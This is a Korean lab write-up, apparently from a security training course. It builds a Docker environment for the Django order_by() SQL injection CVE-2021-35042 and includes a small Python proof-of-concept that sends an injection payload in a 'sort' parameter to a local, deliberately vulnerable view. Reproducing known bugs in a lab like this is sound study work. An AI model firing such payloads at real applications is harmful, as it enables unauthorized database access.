# CVE-2021-35042 - Django QuerySet.order_by() SQL Injection 환경 구축 및 PoC

> 화이트햇스쿨 3기 33반 - 이희민 @gmlals (https://github.com/gmlals/kr-vulhub/tree/main/leehuiminDjango/CVE-2021-35042)


## 요약
Django 3.1.12 버전에서 발생하는 CVE-2021-35042 (QuerySet.order_by() SQL Injection) 취약점에 대한 환경을 Docker 기반으로 구축하고, 이를 검증(PoC)했다.

## 환경 구성
- 사용 기술: Docker, Docker Compose, Django 3.1.12
- 취약 환경 구축 파일:
  - `Dockerfile`
  - `docker-compose.yaml`
- 환경 실행 방법:
  1. `docker-compose up` 명령어로 컨테이너 실행
  2. 브라우저에서 `http://localhost:8000/vuln` 접속하여 서버 상태 확인

## 구축 과정

### 1. Dockerfile 작성
- python:3.8-slim 이미지를 기반으로 Django 3.1.12를 설치
![image](https://github.com/user-attachments/assets/3944eb99-ae91-428d-a5e5-8733535517d7)



### 2. docker-compose.yaml 작성
- Django 앱을 컨테이너로 띄우기 위해 기본 포트 8000을 매핑
![image](https://github.com/user-attachments/assets/29df95ba-d180-4a1b-bfe2-ca3aa6534a86)



### 3. Django 프로젝트 생성 및 vulnapp 앱 생성
- `django-admin startproject config .` 명령어로 프로젝트 생성
- `vulnapp` 앱을 생성하고, `views.py`에 취약한 `vuln_view`를 작성
![image](https://github.com/user-attachments/assets/2cd99ec4-651d-45de-acec-141e49906612)

- `models.py`에 단순한 `TestModel`을 추가하여 정렬 대상 테이블 구성
![image](https://github.com/user-attachments/assets/6ef4e90e-5373-4ea6-bc5d-26e032ce722e)



### 4. URL 연결
- `/vuln` 경로로 vuln_view를 연결

### 5. 서버 실행 확인
- `docker-compose up` 명령어로 서버를 띄운 후, `http://localhost:8000/vuln`에 정상 접속되는 것을 확인
![image](https://github.com/user-attachments/assets/cbf0c93d-6b04-492a-a51d-b1f59457da7c)


## PoC 수행

### 1. 공격 스크립트 작성 (poc.py)
```python
import requests

target = "http://127.0.0.1:8000/vuln"
payload = "extractvalue(1,concat(0x7e,(SELECT sqlite_version())))"

params = {
    "sort": payload
}

res = requests.get(target, params=params)

print("[+] Status Code:", res.status_code)
print("[+] Response Text:", res.text)
```

![image](https://github.com/user-attachments/assets/cd2c2266-3118-43aa-bbd4-2b9b0bf3b5cc)

### 2. 공격 수행 결과
![image](https://github.com/user-attachments/assets/d2cbf111-7d68-4671-af5f-efbb661028e7)
poc.py를 실행한 결과, 서버에서 500 에러와 함께 SQL 오류 메시지가 반환됨.
=> 사용자 입력이 검증되지 않고 직접 쿼리에 삽입되었음을 의미

## 정리
CVE-2021-35042는 Django의 order_by() 함수에서 사용자 입력을 필터링하지 않아 발생하는 SQL Injection 취약점이다.
공격자가 특수 crafted된 sort 파라미터를 삽입할 경우, 데이터베이스로 직접적인 쿼리 조작이 가능하다.
최신 Django 버전에서는 이 문제를 해결하였다.
